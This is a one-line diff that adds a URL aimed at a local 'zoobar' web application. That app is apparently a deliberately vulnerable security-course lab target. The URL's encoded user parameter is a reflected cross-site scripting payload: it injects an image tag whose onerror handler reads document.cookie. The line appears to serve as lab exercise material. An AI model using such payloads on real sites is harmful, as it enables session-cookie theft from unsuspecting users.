@@ -1,0 +1,1 @@
+http://localhost:8080/zoobar/index.cgi/users?user=%20%22%3E%3Cimg%20src=%22a%22%20onerror=%22alert(document.cookie)%22%20a=%22
